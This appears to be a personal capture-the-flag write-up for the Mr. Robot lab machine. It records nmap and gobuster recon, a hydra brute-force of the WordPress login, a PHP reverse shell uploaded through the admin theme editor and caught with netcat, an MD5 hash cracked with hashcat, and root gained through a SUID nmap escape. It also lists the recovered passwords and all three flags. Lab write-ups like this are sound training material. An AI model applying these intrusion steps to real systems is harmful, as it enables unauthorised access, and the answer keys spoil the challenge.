---
ctf:
category:
status: todo
flag:
tags:
  - "#ctf"
---
---

## 0. Challenge
<!-- description, target, files, hints -->
Can you root this Mr. Robot styled machine? This is a lab machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?
## 1. Recon
<!-- what is it? ports, services, tech stack, files, strings -->
##### [[nmap]]:
```
$ nmap -sV -T4 -v -p- $IP

PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  closed http
443/tcp closed https


$ nmap -sV -sC -p 22,80,443 $IP

Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-22 19:27 +0100
Nmap scan report for 10.114.159.16 (10.114.159.16)
Host is up (0.034s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 33:65:94:98:53:ba:8e:0d:61:93:ff:e8:ec:56:31:9f (RSA)
|   256 d6:4c:f8:f5:c4:0d:cc:d3:f4:99:17:55:e0:18:89:84 (ECDSA)
|_  256 b9:39:cf:5e:1c:d5:fc:38:5f:3c:6d:0d:b6:6d:f0:75 (ED25519)
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.16 seconds
```

Now we know that the target is a web server.

## 2. Enumeration
<!-- dig deeper: endpoints, users, versions, hidden stuff, interesting findings -->

Let's enumerate the directories with [[gobuster]]:

```
 gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 10  
 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.114.159.16
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 301) [Size: 0] [--> http://10.114.159.16/%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/]
images               (Status: 301) [Size: 236] [--> http://10.114.159.16/images/]
blog                 (Status: 301) [Size: 234] [--> http://10.114.159.16/blog/]
sitemap              (Status: 200) [Size: 0]
rss                  (Status: 301) [Size: 0] [--> http://10.114.159.16/feed/]
login                (Status: 302) [Size: 0] [--> http://10.114.159.16/wp-login.php]
0                    (Status: 301) [Size: 0] [--> http://10.114.159.16/0/]
feed                 (Status: 301) [Size: 0] [--> http://10.114.159.16/feed/]
video                (Status: 301) [Size: 235] [--> http://10.114.159.16/video/]
image                (Status: 301) [Size: 0] [--> http://10.114.159.16/image/]
atom                 (Status: 301) [Size: 0] [--> http://10.114.159.16/feed/atom/]
wp-content           (Status: 301) [Size: 240] [--> http://10.114.159.16/wp-content/]
admin                (Status: 301) [Size: 235] [--> http://10.114.159.16/admin/]
audio                (Status: 301) [Size: 235] [--> http://10.114.159.16/audio/]
intro                (Status: 200) [Size: 516314]
wp-login             (Status: 200) [Size: 2671]
css                  (Status: 301) [Size: 233] [--> http://10.114.159.16/css/]
rss2                 (Status: 301) [Size: 0] [--> http://10.114.159.16/feed/]
license              (Status: 200) [Size: 309]
wp-includes          (Status: 301) [Size: 241] [--> http://10.114.159.16/wp-includes/]
js                   (Status: 301) [Size: 232] [--> http://10.114.159.16/js/]
Image                (Status: 301) [Size: 0] [--> http://10.114.159.16/Image/]
rdf                  (Status: 301) [Size: 0] [--> http://10.114.159.16/feed/rdf/]
page1                (Status: 301) [Size: 0] [--> http://10.114.159.16/]
readme               (Status: 200) [Size: 64]
robots               (Status: 200) [Size: 41]
dashboard            (Status: 302) [Size: 0] [--> http://10.114.159.16/wp-admin/]
wp-admin             (Status: 301) [Size: 238] [--> http://10.114.159.16/wp-admin/]
...
```

We can immediately find out that this was made in wordpress.

```
┌──(antagoni㉿kali)-[~]
└─$ curl $IP/robots.txt    
User-agent: *
fsocity.dic
key-1-of-3.txt
                                                                                                                    
┌──(antagoni㉿kali)-[~]
└─$ curl $IP/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
                                                                                                                    
┌──(antagoni㉿kali)-[~]
└─$ wget $IP/fsocity.dic   
Prepended http:// to '10.114.159.16/fsocity.dic'
--2026-11-22 20:04:03--  http://10.114.159.16/fsocity.dic
Connessione a 10.114.159.16:80... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 7245381 (6,9M) [text/x-c]
Salvataggio in: «fsocity.dic»

fsocity.dic                  100%[==============================================>]   6,91M  2,96MB/s    in 2,3s    

2026-11-22 20:04:05 (2,96 MB/s) - «fsocity.dic» salvato [7245381/7245381]

┌──(antagoni㉿kali)-[~]
└─$ cat fsocity.dic | wc -l
858160

                                                                                                                    
┌──(antagoni㉿kali)-[~]
└─$ sort fsocity.dic | uniq | wc -l
11451
                                                                                                                    
┌──(antagoni㉿kali)-[~]
└─$ sort fsocity.dic | uniq > dict 

```

Let's use the dictionary we found on the login form at **/wp-login** using [[hydra]]:

```
$ hydra -L dict -p "1234" $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

[80][http-post-form] host: 10.114.159.16   login: Elliot  ...
```

Now we know that `Elliot` is a valid username, we can now attack the password field.

```
$ hydra -l "Elliot" -P dict $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"

[80][http-post-form] host: 10.114.159.16   login: Elliot   password: ER28-0652
```

In the end:
**Username**: Elliot
**Password**: ER28-0652

## 3. Vulnerability
<!-- what is the weakness? ideas tried, what failed -->


## 4. Exploitation
 We are going to upload a php [[reverse shell]] from the wordpress admin page by replacing the code for the 404 page with pentestmonkey/php-reverse-shell

Let's setup a listener using [[netcat]]:
```
┌──(antagoni㉿kali)-[~]
└─$ nc -lvnp 4444                          
listening on [any] 4444 ...
connect to [192.168.168.167] from (UNKNOWN) [10.114.159.16] 57736
Linux ip-10-114-159-16 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 19:57:54 up  2:05,  0 users,  load average: 0.05, 0.45, 0.77
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

We have a foothold on the server!

Now we are going to [[upgrade the shell]] for convenience:

```
daemon@ip-10-114-159-16:/home/robot$ ls
key-2-of-3.txt  password.raw-md5
daemon@ip-10-114-159-16:/home/robot$ cat key-2-of-3.txt 
cat: key-2-of-3.txt: Permission denied
daemon@ip-10-114-159-16:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Now we have to crack the hash.
	robot:c3fcd3d76192e4007dfb496cca67e13b
[[hashcat]]
```
$ hashcat hash -m 0 -a 0 /usr/share/wordlists/rockyou.txt

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

Now we can login as **robot** using the password `abcdefghijklmnopqrstuvwxyz`.

```
┌──(antagoni㉿kali)-[~]
└─$ ssh robot@10.114.159.16    

$ whoami
robot

$ ls
key-2-of-3.txt  password.raw-md5

$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

## 5. Privilege escalation / Post-exploitation
<!-- only if needed: foothold -> user -> root, pivoting, finding the flag -->

[[SUID]]:

```
$ find / -perm -4000 -type f 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help

nmap> /bin/sh

# whoami
root

```

<!--
We are going to use https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

Upload [[LinPEAS]]:
`$ scp linpeas.sh robot@10.114.159.16:/tmp/`

Run it (fast mode):
`$ ./linpeas.sh -s | tee linpeas_output.txt`

Download the output:
`scp robot@10.114.159.16:/tmp/linpeas_output.txt .`
-->
```
root@ip-10-114-159-16:/root# ls
firstboot_done  key-3-of-3.txt
root@ip-10-114-159-16:/root# cat key-3-of-3.txt 
04787ddef27c3dee1ee161b21670b4e4
```

## 6. Flag
1. 073403c8a58a1f80d943455fb30724b9
2. 822c73956184f694993bede3eb39f959
3. 04787ddef27c3dee1ee161b21670b4e4

